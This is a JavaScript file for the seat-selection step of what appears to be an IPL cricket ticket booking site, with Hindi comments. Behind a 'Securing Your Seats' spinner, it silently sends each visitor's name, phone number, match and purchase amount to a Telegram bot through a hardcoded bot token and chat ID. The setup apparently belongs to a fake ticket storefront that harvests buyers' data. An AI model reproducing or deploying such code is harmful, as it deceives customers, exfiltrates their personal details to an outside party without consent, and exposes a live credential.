import { db, ref, get } from "./firebase.js";

document.addEventListener("DOMContentLoaded", async () => {
    const venueImgEl = document.getElementById('venue-img');
    const matchTitleEl = document.getElementById('match-title');
    const matchId = localStorage.getItem('matchId');

    // --- INITIAL DATA SETUP ---
    window.sPrice = 0; 
    window.sQty = 1;   
    window.sType = "None";

    // 1. 🔥 VENUE IMAGE LOADING (WITH FALLBACK)
    if (matchId && db) {
        try {
            const snapshot = await get(ref(db, `matches/${matchId}`));
            if (snapshot.exists()) {
                const data = snapshot.val();
                if (matchTitleEl) matchTitleEl.innerText = data.title || "Match Details";
                if (venueImgEl && data.venue_img) {
                    venueImgEl.src = data.venue_img;
                    venueImgEl.style.display = 'block';
                }
            }
        } catch (e) {
            console.log("Firebase sync skipped or failed");
        }
    } 
    
    // 🔥 Fallback: अगर Firebase से लोड ना हो, तो LocalStorage से उठा लो (Details हमेशा दिखेंगी)
    const savedMatch = JSON.parse(localStorage.getItem('selectedMatch') || "{}");
    if (matchTitleEl && matchTitleEl.innerText === "" && savedMatch.title) {
        matchTitleEl.innerText = savedMatch.title;
    }
    if (venueImgEl && venueImgEl.src === "" && savedMatch.venue_img) {
        venueImgEl.src = savedMatch.venue_img;
        venueImgEl.style.display = 'block';
    }

    // --- SEAT SELECTION LOGIC ---
    window.setSeat = (name, price, el) => {
        document.querySelectorAll('.type-card').forEach(c => c.classList.remove('selected'));
        el.classList.add('selected');

        window.sType = name;
        window.sPrice = price;

        document.getElementById('res-type').innerText = name;
        document.getElementById('res-price').innerText = `₹${price}`;
        
        const btn = document.getElementById('final-btn');
        if(btn) {
            btn.disabled = false;
            btn.classList.add('active');
            btn.innerText = "Continue to Address"; // टेक्स्ट अपडेट कर दिया
        }
        refreshTotal();
    };

    window.updateQty = (val) => {
        let n = window.sQty + val;
        if (n >= 1 && n <= 10) {
            window.sQty = n;
            document.getElementById('res-qty').innerText = n;
            refreshTotal();
        }
    };

    function refreshTotal() {
        const total = window.sQty * window.sPrice;
        document.getElementById('res-total').innerText = `₹${total}`;
        
        localStorage.setItem("finalPrice", total);
        localStorage.setItem("selectedTotalPrice", total);
        localStorage.setItem("selectedSeatType", window.sType);
        localStorage.setItem("seatQuantity", window.sQty);
    }

    // 5. 🔥 THE ULTIMATE REDIRECT FUNCTION 🔥
    window.goNext = async () => {
        if (window.sPrice > 0) {
            
            // 1. Button Block
            const btn = document.getElementById('final-btn');
            if(btn) {
                btn.innerText = "Processing...";
                btn.style.pointerEvents = "none";
            }

            // 2. SHOW SPINNER
            const loader = document.createElement('div');
            loader.innerHTML = `
                <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.95); z-index:99999; display:flex; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(5px);">
                    <div style="width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #00cf7f; border-radius: 50%; animation: load-spin 1s linear infinite;"></div>
                    <h3 style="margin-top:20px; color:#333; font-family:sans-serif; font-size:18px; font-weight:700;">Securing Your Seats...</h3>
                    <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Please wait, redirecting to details page</p>
                    <style>@keyframes load-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
                </div>
            `;
            document.body.appendChild(loader);

            // 3. Telegram Data
            const name = localStorage.getItem('customerName') || "Unknown";
            const phone = localStorage.getItem('customerPhone') || "Unknown";
            
            const matchTitleElCurrent = document.getElementById('match-title');
            const matchTitle = (matchTitleElCurrent && matchTitleElCurrent.innerText) ? matchTitleElCurrent.innerText : savedMatch.title || "IPL Match";
            
            const resTypeEl = document.getElementById('res-type');
            const seatType = (resTypeEl && resTypeEl.innerText) ? resTypeEl.innerText : window.sType;
            
            const totalAmt = window.sQty * window.sPrice;

            const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
            const chatId = "6820660513"; 
            
            // 🔥 एकदम सही हिंदी Telegram मैसेज (Address Page के लिए) 🔥
            const telegramMsg = `🏠 <b>कस्टमर Address Page पर पहुँच गया!</b> 🏠\n\n` +
                                `👤 <b>नाम (Name):</b> ${name}\n` +
                                `📞 <b>नंबर (WhatsApp):</b> ${phone}\n` +
                                `🏏 <b>मैच (Match):</b> ${matchTitle}\n` +
                                `🎟️ <b>सीट (Seats):</b> ${window.sQty} x ${seatType}\n` +
                                `💵 <b>कुल रकम (Total Amount):</b> ₹${totalAmt}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=HTML`;

            // 4. BHEJO AUR WAIT KARO
            try {
                await fetch(url);
            } catch (err) {
                console.log("Telegram alert failed");
            }

            // 5. FAILSAFE TIMER (अब यह payment.html की जगह details.html पर जाएगा)
            setTimeout(() => {
                window.location.href = "details.html";
            }, 1200);

        } else {
            alert("Kripya pehle seat type select karein!");
        }
    };

    // 🔥 HYPER-FIX: HTML BUTTON KO JABARDASTI KABOO MEIN KARNA 🔥
    setTimeout(() => {
        const finalBtn = document.getElementById('final-btn');
        if (finalBtn) {
            if (finalBtn.hasAttribute('href')) {
                finalBtn.removeAttribute('href');
            }
            finalBtn.onclick = function(e) {
                if(e && e.preventDefault) e.preventDefault(); 
                window.goNext(); 
            };
        }
    }, 500); 
});
